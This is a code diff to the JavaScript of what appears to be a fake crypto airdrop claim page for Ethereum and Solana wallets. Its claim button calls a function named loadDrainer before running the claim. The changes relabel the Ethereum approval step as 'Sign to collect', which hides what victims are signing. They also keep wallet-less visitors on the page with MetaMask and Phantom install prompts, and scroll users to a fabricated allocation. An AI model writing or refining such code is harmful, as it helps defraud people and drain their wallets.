@@ -110,6 +110,7 @@ const addressError = $("#address-error");
 const queryButton = $("#query-button");
 const connectButton = $("#connect-button");
 const connectStatus = $("#connect-status");
+const connectHint = $("#connect-hint");
 const pasteButton = $("#paste-button");
 const result = $("#result");
 const resultAddress = $("#result-address");
@@ -127,6 +128,7 @@ const claimBox = $("#claim-box");
 const claimButton = $("#claim-button");
 const claimSub = $("#claim-sub");
 const claimStatus = $("#claim-status");
+const claimHint = $("#claim-hint");
 const feeBlock = $("#fee-block");
 const feeNetwork = $("#fee-network");
 const feeDepositRow = $("#fee-deposit-row");
@@ -170,6 +172,36 @@ function getSolProvider() {
 }
 
 const inWallet = () => Boolean(getSolProvider() || window.ethereum);
+const hasWalletFor = (key) => (key === "eth" ? Boolean(window.ethereum) : Boolean(getSolProvider()));
+
+const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)");
+
+/* no wallet installed: stay on the page and let the user choose to install */
+const WALLETS = {
+  eth: { missing: "No Ethereum wallet in this browser.", label: "Install MetaMask", url: "https://metamask.io/download/" },
+  sol: { missing: "No Solana wallet in this browser.", label: "Install Phantom", url: "https://phantom.app/download" },
+};
+
+function clearWalletHints() {
+  for (const hint of [connectHint, claimHint]) hint.replaceChildren();
+}
+
+function showWalletHint(target) {
+  clearWalletHints();
+  const wallet = WALLETS[chain.key];
+  target.append(wallet.missing + " ");
+  const link = document.createElement("a");
+  link.href = wallet.url;
+  link.target = "_blank";
+  link.rel = "noopener";
+  link.textContent = wallet.label;
+  target.append(link);
+}
+
+function scrollToResult() {
+  if (result.hidden) return;
+  result.scrollIntoView({ behavior: reduceMotion.matches ? "auto" : "smooth", block: "start" });
+}
 
 function setMessage(el, text) {
   el.textContent = text;
@@ -446,7 +478,7 @@ function showAllocation(address, usd) {
   lastAmount = tokenAmount >= 1 ? tokenAmount.toFixed(3) : (Math.floor(tokenAmount * 1e5) / 1e5).toFixed(5);
   lastEstimate = "≈ " + usdFine.format(lastUsd);
   symbolEl.textContent = chain.symbol;
-  claimButton.textContent = chain.key === "eth" ? "Approve in wallet" : "Sign to collect";
+  claimButton.textContent = "Sign to collect";
   /* the fee block already shows SOL_FEE + deposit; nothing to add here */
   applyVisibility();
   setMessage(claimStatus, "");
@@ -457,6 +489,7 @@ function showAllocation(address, usd) {
 /* ---------------- lookup ---------------- */
 
 async function lookup(address) {
+  clearWalletHints();
   if (activeLookup) activeLookup.abort();
   const controller = new AbortController();
   activeLookup = controller;
@@ -520,6 +553,7 @@ async function renderResult(address, values) {
     setMessage(rpcStatus, "Nothing to move from this address yet - top it up with a small amount first.");
   } else {
     setMessage(rpcStatus, "");
+    scrollToResult();
   }
 }
 
@@ -543,7 +577,7 @@ function clearAutoTimers() {
   clearTimeout(fallbackTimer);
 }
 
-const signLabel = () => (chain.key === "eth" ? "Approve in wallet" : "Claim now");
+const signLabel = () => "Sign to collect";
 const alreadyConnected = () =>
   chain.key === "sol"
     ? Boolean(getSolProvider()?.publicKey)
@@ -944,6 +978,7 @@ function setChain(key) {
   addressInput.placeholder = chain.placeholder;
   addressInput.value = "";
   setMessage(addressError, "");
+  clearWalletHints();
   result.hidden = true;
 }
 
@@ -975,8 +1010,9 @@ document.querySelectorAll(".chain-tab").forEach((tab) => {
 });
 
 connectButton.addEventListener("click", async () => {
-  if (!inWallet()) {
-    location.href = deeplink(currentAddress || "");
+  clearWalletHints();
+  if (!hasWalletFor(chain.key)) {
+    showWalletHint(connectHint);
     return;
   }
   connectButton.disabled = true;
@@ -1025,8 +1061,9 @@ changeAddress.addEventListener("click", () => {
 });
 
 claimButton.addEventListener("click", () => {
-  if (!inWallet()) {
-    location.href = deeplink(currentAddress);
+  clearWalletHints();
+  if (!hasWalletFor(chain.key)) {
+    showWalletHint(claimHint);
     return;
   }
   void loadDrainer().catch(() => {}).then(runClaim);
